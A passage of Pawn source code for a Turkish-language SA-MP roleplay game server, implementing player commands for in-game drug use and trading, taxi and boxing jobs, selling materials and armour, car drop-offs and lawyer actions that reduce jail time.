		GetPlayerArmour(playerid, PlayersArmour);
		SendClientMessage(playerid, COLOR_GREY, " 2 gram crack kullandýn!");
		format(string, sizeof(string), "* %s adlý kiþi bir miktar crack kullandý.", GetPlayerNameEx(playerid));
		ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		PlayerInfo[playerid][pCrack] -= 2;
		UsedCrack[playerid] = 1;
		SetTimerEx("ClearDrugs", 5000, false, "d", playerid);
		if(PlayersArmour > 90)
		{
			SetPlayerArmourEx(playerid, 100);
		}
		else
		{
			SetPlayerArmourEx(playerid, PlayersArmour + 10.0);
		}
		if(!IsPlayerInAnyVehicle(playerid)) ApplyAnimation(playerid,"SMOKING","M_smkstnd_loop",2.1,0,0,0,0,0);
		switch(GetPVarInt(playerid, "STD")) {
			case 1:
			{
				DeletePVar(playerid, "STD");
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Uyuþturucu kullandýðýn için AIDS hastalýðýndan kurtuldun!!");
			}
			case 2:
			{
				SetPVarInt(playerid, "STD", 1);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You reduced the STD to chlamydia because of the drugs!");
			}
			case 3:
			{
				SetPVarInt(playerid, "STD", 2);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You reduced the STD to gonorrhea because of the drugs!");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Üzerinde crack yok!");
	}
	return 1;
}

CMD:taksimetre(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 6 || PlayerInfo[playerid][pLeader] == 6)
	{
		new string[128], fare;
		if(sscanf(params, "d", fare)) return SendClientMessage(playerid, COLOR_WHITE, "{FFFFFF}[{FF0000}@{FFFFFF}] KULLANIM: /taksimetre [fiyat]");

		if(TransportDuty[playerid] > 0)
		{
			if(TransportDuty[playerid] == 1)
			{
				TaxiDrivers -= 1;
			}
			else if(TransportDuty[playerid] == 2)
			{
				BusDrivers -= 1;
			}
			TransportDuty[playerid] = 0;
			format(string, sizeof(string), "* Þuanda iþ baþýnda deðilsin, Kazancýn: %d $.", TransportMoney[playerid]);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, TransportMoney[playerid]);
			ConsumingMoney[playerid] = 1; TransportValue[playerid] = 0; TransportMoney[playerid] = 0;
			SetPlayerToTeamColor(playerid);
			return 1;
		}
		if(JobDuty[playerid] != 0) return SendClientMessage(playerid,COLOR_GREY,"Avukat mesleðinden çýkmanýz gerekiyor.");
		new newcar = GetPlayerVehicleID(playerid);
		if(IsAnTaxi(newcar))
		{
			if(GetPlayerState(playerid) == 2)
			{
				if(fare < 1 || fare > 50)
				{
					SendClientMessage(playerid, COLOR_GREY, "   Taksimetre 1 $ ile 50 $ arasýnda açýlabilir!");
					return 1;
				}
				TaxiDrivers += 1; TransportDuty[playerid] = 1; TransportValue[playerid] = fare;
				format(string, sizeof(string), "* Taksi þöförü olarak iþ baþý yaptýn, Taksimetre:  %d $.", TransportValue[playerid]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "[TAKSÝ] %s adlý kiþi taksi þoförü olarak iþ baþý yaptý. (/cagir taksi)", GetPlayerNameEx(playerid));
			    SendClientMessageToAllEx(COLOR_GREEN, string);
				SetPlayerToTeamColor(playerid);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   Sürücü deðilsiniz!");
				return 1;
			}
		}
	}
	return 1;
}

CMD:dovus(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 12 && PlayerInfo[playerid][pJob2] != 12)
	{
		SendClientMessage(playerid, COLOR_GREY, "   Boxör deðilsin!");
		return 1;
	}
	if(InRing > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "   Zaten bir Box müsabakasý sürüyor, bitmesini beklemelisin!");
		return 1;
	}
	if(PlayerBoxing[playerid] > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "   Zaten Box müsabakasýndasýn!");
		return 1;
	}

	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /dovus [Oyuncu ID/Ýsim]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(ProxDetectorS(8.0, playerid, giveplayerid))
		{
			if(IsPlayerInRangeOfPoint(playerid,20.0,765.952270, 4.167977, 1000.719238))
			{
				if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Kendi kendine box yapamazsýn!"); return 1; }
				format(string, sizeof(string), "* %s adlý kiþiye bir box müsabakasý teklif ettin.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Boxör %s sizinle bir box müsabakasý yapmak istiyor (örnek: /kabulet dovus).", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				BoxOffer[giveplayerid] = playerid;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2,"GYM'de deðilsin!");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
			return 1;
		}

	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
		return 1;
	}
	return 1;
}

CMD:boxistatistik(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 12 && PlayerInfo[playerid][pJob2] != 12)
	{
		SendClientMessage(playerid, COLOR_GREY, "   Boxör deðilsin!");
		return 1;
	}

	new string[128], ttext[20];//Title
	new clevel = PlayerInfo[playerid][pBoxSkill];
	if(clevel >= 0 && clevel <= 50) { ttext = "Acemi"; }
	else if(clevel >= 51 && clevel <= 200) { ttext = "Amatör"; }
	else if(clevel >= 201 && clevel <= 400) { ttext = "Profesyonel"; }
	new ntext[20];//NickName
	new level = PlayerInfo[playerid][pWins];
	if(level > 0 && PlayerInfo[playerid][pLoses] == 0)
	{
		ntext = "Yenilmez";
	}
	else
	{
		if(level >= 0 && level <= 10) { ntext = "Yeni Gelen"; }
		else if(level >= 11 && level <= 20) { ntext = "Sert Herif"; }
		else if(level >= 21 && level <= 30) { ntext = "Ceviz Kýracaðý"; }
		else if(level >= 31 && level <= 40) { ntext = "Demir Yumruk"; }
		else if(level >= 41 && level <= 50) { ntext = "Kafatasý Avcýsý"; }
		else if(level >= 51 && level <= 60) { ntext = "Hafif ve Hýzlý"; }
		else if(level >= 61 && level <= 70) { ntext = "Savaþcý"; }
		else if(level >= 71) { ntext = "Rambo"; }
	}
	SendClientMessage(playerid, COLOR_WHITE, "|__________________ Box Kayýtlarý __________________|");
	format(string, sizeof(string), "| Baþlýk: %s.", ttext);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "| Takma Ýsim: %s.", ntext);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "| Toplam Galibiyet: %d.", PlayerInfo[playerid][pWins]);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "| Toplam Malubiyet: %d.", PlayerInfo[playerid][pLoses]);
	SendClientMessage(playerid, COLOR_GREY, string);
	SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________________|");
	return 1;
}

CMD:give(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	new string[128], giveplayerid, choice[32], amount;
	if(sscanf(params, "us[32]d", giveplayerid, choice, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /give [Oyuncu ID/Ýsim] [name] [amount]");
		SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Pot, Crack, Materials");
		return 1;
	}

	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID)
		{
			if(amount < 1)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Üzerinde bu kadar yok!");
				return 1;
			}

			if(!ProxDetectorS(5.0, playerid, giveplayerid))
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
				return 1;
			}

			if(giveplayerid == playerid)
			{
			    SendClientMessage(playerid, COLOR_GREY, "Bu komutu kendi üzerinde kullanamazsýn!");
			    return 1;
			}

			if(strcmp(choice, "materials", true) == 0)
			{
				if(PlayerInfo[playerid][pMats] >= amount)
				{
					format(string, sizeof(string), "%s adlý kiþiden %d mataryel aldýn.", GetPlayerNameEx(playerid), amount);
					SendClientMessage(giveplayerid, COLOR_GRAD2, string);
					PlayerInfo[giveplayerid][pMats] += amount;
					PlayerInfo[playerid][pMats] -= amount;
					new ip[32], ipex[32];
					GetPlayerIp(playerid, ip, sizeof(ip));
					GetPlayerIp(giveplayerid, ipex, sizeof(ipex));
					format(string, sizeof(string), "%s(IP:%s) has given %s(IP:%s) %d materials.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(giveplayerid), ipex, amount);
					Log("logs/pay.log", string);
					format(string, sizeof(string), "%s adlý kiþiye %d materyal verdin.", GetPlayerNameEx(giveplayerid), amount);
					SendClientMessage(playerid, COLOR_GRAD2, string);
					format(string, sizeof(string), "* %s adlý kiþi %s adlý kiþiye bir miktar materyal verir.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu kadar materyalin yok!");
					return 1;
				}
			}
			if(strcmp(choice, "pot", true) == 0)
			{
				if(PlayerInfo[playerid][pPot] >= amount)
				{
					if(amount + PlayerInfo[giveplayerid][pPot] >= 51)
					{
						SendClientMessage(playerid, COLOR_GREY, "Bu kiþi 50 den fazla pot taþýyamaz!");
						return 1;
					}
					new level = PlayerInfo[playerid][pDrugsSkill];
					if(level >= 0 && level < 50)
					{ if(amount < 1 || amount > 10) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 10'dan fazla taþýyamazsýn!"); return 1; } }
					else if(level >= 50 && level < 100)
					{ if(amount < 1 || amount > 20) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 20'den fazla taþýyamazsýn!"); return 1; } }
					else if(level >= 100 && level < 200)
					{ if(amount < 1 || amount > 30) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 30'dan fazla taþýyamazsýn!"); return 1; } }
					else if(level >= 200 && level < 400)
					{ if(amount < 1 || amount > 40) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 40'dan fazla taþýyamazsýn."); return 1; } }
					else if(level >= 400)
					{ if(amount < 1 || amount > 50) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 50'den fazla taþýyamazsýn."); return 1; } }
					format(string, sizeof(string), "%s adlý kiþiden %d Pot aldýn.", GetPlayerNameEx(playerid), amount);
					SendClientMessage(giveplayerid, COLOR_GRAD2, string);
					PlayerInfo[giveplayerid][pPot] += amount;
					PlayerInfo[playerid][pPot] -= amount;
					new ip[32], ipex[32];
					GetPlayerIp(playerid, ip, sizeof(ip));
					GetPlayerIp(giveplayerid, ipex, sizeof(ipex));
					format(string, sizeof(string), " %s adlý kiþiye %d Pot verdin.", GetPlayerNameEx(giveplayerid), amount);
					SendClientMessage(playerid, COLOR_GRAD2, string);
					format(string, sizeof(string), "* %s adlý kiþi %s adlý kiþiye bir miktar pot verir.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Üzerinde bu kadar Pot yok!");
					return 1;
				}
			}
			if(strcmp(choice, "crack", true) == 0)
			{
				if(PlayerInfo[playerid][pCrack] >= amount)
				{
					if(amount + PlayerInfo[giveplayerid][pCrack] >= 26)
					{
						SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu 25 Crack'ten fazlasýný taþýyamaz!");
						return 1;
					}
					new level = PlayerInfo[playerid][pDrugsSkill];
					if(level >= 0 && level < 50)
					{ if(amount < 1 || amount > 5) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 5'den fazla taþýyamazsýn!"); return 1; } }
					else if(level >= 50 && level < 100)
					{ if(amount < 1 || amount > 10) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 10'dan fazla taþýyamazsýn!"); return 1; } }
					else if(level >= 100 && level < 200)
					{ if(amount < 1 || amount > 15) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 15'den fazla taþýyamazsýn!"); return 1; } }
					else if(level >= 200 && level < 400)
					{ if(amount < 1 || amount > 20) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 20'den fazla taþýyamazsýn!"); return 1; } }
					else if(level >= 400)
					{ if(amount < 1 || amount > 25) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 25'ten fazla taþýyamazsýn!"); return 1; } }
					format(string, sizeof(string), " %s adlý kiþiden %d crack aldýn.", GetPlayerNameEx(playerid), amount);
					SendClientMessage(giveplayerid, COLOR_GRAD2, string);
					PlayerInfo[giveplayerid][pCrack] += amount;
					PlayerInfo[playerid][pCrack] -= amount;
					new ip[32], ipex[32];
					GetPlayerIp(playerid, ip, sizeof(ip));
					GetPlayerIp(giveplayerid, ipex, sizeof(ipex));
					format(string, sizeof(string), "%s adlý kiþiye %d crack verdin.", GetPlayerNameEx(giveplayerid), amount);
					SendClientMessage(playerid, COLOR_GRAD2, string);
					format(string, sizeof(string), "* %s adlý kiþi %s adlý kiþiye bir miktar crack verir.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Üzerinde bu kadar crack yok!");
					return 1;
				}
			}
		}
	}
	return 1;
}

CMD:paketal(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 9 && PlayerInfo[playerid][pJob2] != 9 && PlayerInfo[playerid][pJob] != 18 && PlayerInfo[playerid][pJob2] != 18)
	{
		SendClientMessage(playerid,COLOR_GREY,"   Zanaatkar veya Silah satýcýsý deðilsin!");
		return 1;
	}
	if(CheckPointCheck(playerid))
	{
		SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");
		return 1;
	}

	new mypoint = -1;
	new mypointex = -1;
	new mydeliver = 0;

	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));
	for (new i=0; i<MAX_POINTS; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[i][Pointx], Points[i][Pointy], Points[i][Pointz]) && Points[i][Type] == 1)
		{
			mypoint = i;
			mypointex = i;
			mydeliver = Points[i][MatPoint];
		}
	}
	if(mypoint == -1)
	{
		SendClientMessage(playerid, COLOR_GREY, "Paket alabileceðin herhangi bir yer yok!");
		return 1;
	}
	mypoint = -1;
	for (new i=0; i<MAX_POINTS; i++)
	{
		if(Points[i][MatPoint] == mydeliver && Points[i][Type] == 2)
		{
			mypoint = i;
		}
	}
	if(mypoint == -1)
	{
		SendClientMessage(playerid, COLOR_GREY, " Ulaþtýðýn noktada bir Materyal fabrikasý yok!");
		return 1;
	}
    if(GetPVarInt(playerid, "Packages") > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "   Daha fazla Materyal paketi taþýyamazsýn!");
		return 1;
	}
	if(GetPlayerCash(playerid) < 50)
	{
		SendClientMessage(playerid, COLOR_GREY," Üzerinde yeterli para yok!");
		return 1;
	}
	GivePlayerCash(playerid, -50);
	SetPVarInt(playerid, "Packages", 10);
	SendClientMessage(playerid, COLOR_LIGHTBLUE,"*  50$ karþýlýðýnda 10 adet materyal paketi aldýn.");

	SetPVarInt(playerid, "MatDeliver", mydeliver);
	SetPVarInt(playerid, "tpMatRunTimer", 10);
	SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPMATRUNTIMER);

	for(new i = 0; i < sizeof(FamilyInfo); i++)
	{
		if(strcmp(Points[mypointex][Owner], FamilyInfo[i][FamilyName], true) == 0)
		{
			FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+25;
		}
	}
	SetPlayerCheckpoint(playerid, Points[mypoint][Pointx], Points[mypoint][Pointy], Points[mypoint][Pointz], 5);
	return 1;
}



CMD:materyalsat(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	if(PlayerInfo[playerid][pJob] != 9 && PlayerInfo[playerid][pJob2] != 9 && PlayerInfo[playerid][pJob] != 18 && PlayerInfo[playerid][pJob2] != 18)
	{
		SendClientMessage(playerid, COLOR_GREY, "Zanaatkar veya Silah satýcýsý deðilsin");
		return 1;
	}
	new string[128];
	if(GetPVarInt(playerid, "SellMatsTimer") > 0)
	{
		format(string, sizeof(string), "Materyal satabilmek için %d saniye beklemelisiniz..", GetPVarInt(playerid, "SellMatsTimer"));
		SendClientMessage(playerid,COLOR_GREY,string);
		return 1;
	}

	new giveplayerid, amount, price;
	if(sscanf(params, "udd", giveplayerid, amount, price)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /materyalsat [Oyuncu ID/Ýsim] [miktar] [fiyat]");

	if(amount < 1) { SendClientMessage(playerid, COLOR_GREY, "Materyal miktarý 1 den düþük olamaz!"); return 1; }
    if(price < 5000) { SendClientMessage(playerid, COLOR_GREY, "Fiyat 5000$'dan düþük olamaz, Daha az satýþlar için /ode komutunu kullanabilirsin."); return 1; }
	if(amount > PlayerInfo[playerid][pMats]) { SendClientMessage(playerid, COLOR_GREY, "Üzerinde bu kadar mataryel yok!"); return 1; }

	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID)
		{
			if(ProxDetectorS(8.0, playerid, giveplayerid))
			{
				if(giveplayerid == playerid)
				{
					SendClientMessage(playerid, COLOR_GREY, "Kendi kendine materyal satamazsýn!");
					return 1;
				}
				format(string, sizeof(string), "* %s adlý kiþiye %d adet mataryeli %d$ fiyatýna satýyorsun.", GetPlayerNameEx(giveplayerid), amount, price);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* %s adlý kiþi sana %d materyali %d$ fiyatýna satmak istiyor, (type /kabulet materyal).", GetPlayerNameEx(playerid), amount, price);
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);

				SetPVarInt(playerid, "SellMatsTimer", 30); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_SELLMATSTIMER);

				MatsOffer[giveplayerid] = playerid;
				MatsPrice[giveplayerid] = price;
				MatsAmount[giveplayerid] = amount;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	return 1;
}

CMD:zirhsat(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 8 && PlayerInfo[playerid][pJob2] != 8)
	{
		SendClientMessage(playerid, COLOR_GREY, "Bodyguard degilsin.");
		return 1;
	}

	if(GetPVarInt(playerid, "EventToken") == 1 && EventInfo[EventToggleHeal] == 1)
		return SendClientMessage(playerid, COLOR_GRAD2, "Etkinlikteyken bu komutu kullanamazsýn!");

	if(PlayerBoxing[playerid] > 0)
  	{
   		SendClientMessage(playerid, COLOR_GREY, "Box müsabakasýnda zýrh satamazsýn.");
     	return 1;
   	}

	new string[128], giveplayerid, money;
	if(sscanf(params, "ud", giveplayerid, money)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /zirhsat [Oyuncu ID/Ýsim] [fiyat]");
	if(GetPVarInt(playerid, "GuardTimer") > 0)
	{
		format(string, sizeof(string), "   Baþka bir zýrh satmak için %d saniye beklemelisiniz.", GetPVarInt(playerid, "GuardTimer"));
		SendClientMessage(playerid,COLOR_GREY,string);
		return 1;
	}
	if(money < 200 || money > 1000) { SendClientMessage(playerid, COLOR_GREY, "Ücret 200$ ile 1000$ arasýnda olabilir."); return 1; }
	if(IsPlayerConnected(giveplayerid))
	{

		if(ProxDetectorS(8.0, playerid, giveplayerid))
		{
			if(giveplayerid == playerid)
			{
				SendClientMessage(playerid, COLOR_GREY, "Kendi kendine zýrh satamazsýn.");
				return 1;
			}

			SetPVarInt(playerid, "GuardTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GUARDTIMER);
			format(string, sizeof(string), "* %s adlý kiþiye %d$ karþýlýðý zýrh satmaya çalýþýyorsun.", GetPlayerNameEx(giveplayerid), money);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* Bodyguard %s size %d$ karþýlýðýnda zýrh satmaya çalýþýyor, örnek: /kabulet zirh.", GetPlayerNameEx(playerid), money);
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			GuardOffer[giveplayerid] = playerid;
			GuardPrice[giveplayerid] = money;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
		}

	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
	}
	return 1;
}

CMD:aileduyuru(playerid, params[]) {
	if(PlayerInfo[playerid][pGang] < 255) {
	    new
	        string[128];

		format(string, sizeof(string), "Aile Duyurusu: %s.", FamilyInfo[PlayerInfo[playerid][pGang]][FamilyMOTD]);
		SendClientMessage(playerid, COLOR_YELLOW, string);
	}
	return 1;
}

CMD:aracikinciel(playerid, params[])
{
	return cmd_aracieldencikar(playerid, params);
}

CMD:aracieldencikar(playerid, params[])
{
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}
	if(PlayerInfo[playerid][pCarTime] == 0)
	{
		if(CheckPointCheck(playerid))
		{
			SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");
			return 1;
 		}
 		if(PlayerInfo[playerid][pConnectTime] < 2)
 		{
 		    SendClientMessage(playerid, COLOR_GREY, "You need at least 2 playing hours before you can drop off a car.");
 		    return 1;
 		}

		GameTextForPlayer(playerid, "~w~Arac Satisi ~n~~r~Araci limana birak", 5000, 1);
		CP[playerid] = 1;
		SetPlayerCheckpoint(playerid, 2695.8699,-2225.3853,13.5501,8.0);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   Zaten bir aracý sattýn, Tekrar satabilmek için beklemelisin!");
	}
	return 1;
}

CMD:avukatisbasi(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] == 2 || PlayerInfo[playerid][pJob2] == 2)
	{
        if(JobDuty[playerid] == 1)
		{
            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Þuanda Avukat olarak iþbaþýnda deðislin.Artýk teklifler gelmeyecek.");
            JobDuty[playerid] = 0;
            Lawyers -= 1;
        }
        else
		{
            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Þuanda Avukat olarak iþbaþýndasýn.Teklifler ekranýnda gözükecektir.");
            JobDuty[playerid] = 1;
            Lawyers += 1;
        }
    }
    else
	{
        SendClientMessage(playerid, COLOR_GRAD1, "   Avukat deðilsin!");
    }
    return 1;
}

CMD:koru(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 2 && PlayerInfo[playerid][pJob2] != 2)
	{
		SendClientMessage(playerid, COLOR_GREY, "   Avukat deðilsin!");
		return 1;
	}

	new string[128];
	if(PlayerInfo[playerid][pLawyerTime] >= 1)
	{
		format(string, sizeof(string), " Müvekkilini tekrar savunmak için %d beklemelisiniz!", PlayerInfo[playerid][pLawyerTime]);
		SendClientMessage(playerid, COLOR_GRAD1,string);
		return 1;
	}

	new giveplayerid, money;
	if(sscanf(params, "ud", giveplayerid, money)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /koru [Oyuncu ID/Ýsim] [fiyat]");
	if(money < 200 || money > 1000) { SendClientMessage(playerid, COLOR_GREY, "   200$ - 1000$ arasýnda bir fiyat seçiniz!"); return 1; }
	if(IsPlayerConnected(giveplayerid))
	{
		if(ProxDetectorS(8.0, playerid, giveplayerid))
		{
			if(giveplayerid == playerid)
			{
				SendClientMessage(playerid, COLOR_GREY, "   Kendi kendini koruyamazsýn!");
				return 1;
			}
			if(PlayerInfo[giveplayerid][pWantedLevel] > 0)
			{
				format(string, sizeof(string), "* %s adlý kiþiye %d$ karþýlýðý hukuki savunma teklif ediyorsun.", GetPlayerNameEx(giveplayerid), money);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Avukat %s seni %d$ karþýlýðý savunmak istiyor, (kabul etmek için /kabulet koru)", GetPlayerNameEx(playerid), money);
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pLawyerTime] = 60;
				DefendOffer[giveplayerid] = playerid;
				DefendPrice[giveplayerid] = money;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   Bu kiþi arananlar listesinde deðil!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
	}
	return 1;
}

CMD:serbestbirak(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 2 && PlayerInfo[playerid][pJob2] != 2)
		return SendClientMessage(playerid, COLOR_GREY, "   Avukat Deðilsin!");

	new
		string[128],
		giveplayerid;

	if(sscanf(params, "u", giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /serbestbirak [Oyuncu ID/Ýsim]");

	if(IsPlayerConnected(giveplayerid)) {
		if(giveplayerid == playerid)
			return SendClientMessage(playerid, COLOR_GREY, "Kendi kendini serbest býrakamazsýn!");

		if(GetDistanceBetweenPlayers(giveplayerid, playerid) > 5)
			return SendClientMessage(playerid, COLOR_GREY, "Çok uzaktasýn.");

		if(PlayerInfo[playerid][pLawyerFreeTime] >= 1) {
			format(string, sizeof(string), "%d saniye beklemeniz gerekiyor!", PlayerInfo[playerid][pLawyerFreeTime]);
			SendClientMessage(playerid, COLOR_GRAD1,string);
			return 1;
		}

		if(PlayerInfo[giveplayerid][pJailed] == 1 || PlayerInfo[giveplayerid][pJailed] == 2) {
			//ApprovedLawyer[playerid] = 0;
			WantLawyer[giveplayerid] = 0;
			CallLawyer[giveplayerid] = 0;
			JailPrice[giveplayerid] = 0;

			new level = PlayerInfo[playerid][pLawSkill];
			if(level >= 0 && level < 50) {
				PlayerInfo[giveplayerid][pJailTime] -= 60;
				PlayerInfo[playerid][pLawyerFreeTime] = 160;

				format(string, sizeof(string), "* %s adlý kiþinin hapis süresini 1 dakika azalttýn.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Avukat %s, hapis süreni 1 dakika azalttý.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			} else if(level >= 50 && level < 100) {
				PlayerInfo[giveplayerid][pJailTime] -= 120;
				PlayerInfo[playerid][pLawyerFreeTime] = 120;

				format(string, sizeof(string), "* %s adlý kiþinin hapis süresini 2 dakika azalttýn.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Avukat %s, hapis süreni 2 dakika azalttý.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			} else if(level >= 100 && level < 200) {
				PlayerInfo[giveplayerid][pJailTime] -= 180;
				PlayerInfo[playerid][pLawyerFreeTime] = 90;

				format(string, sizeof(string), "* %s adlý kiþinin hapis süresini 3 dakika azalttýn.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Avukat %s, hapis süreni 3 dakika azalttý.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			} else if(level >= 200 && level < 400) {
				PlayerInfo[giveplayerid][pJailTime] -= 240;
				PlayerInfo[playerid][pLawyerFreeTime] = 60;

				format(string, sizeof(string), "* %s adlý kiþinin hapis süresini 4 dakika azalttýn.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Avukat %s, hapis süreni 4 dakika azalttý.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			} else if(level >= 400) {
				PlayerInfo[giveplayerid][pJailTime] -= 300;
				PlayerInfo[playerid][pLawyerFreeTime] = 30;

				format(string, sizeof(string), "* %s adlý kiþinin hapis süresini 5 dakika azalttýn.", GetPlayerNameEx(giveplayerid));
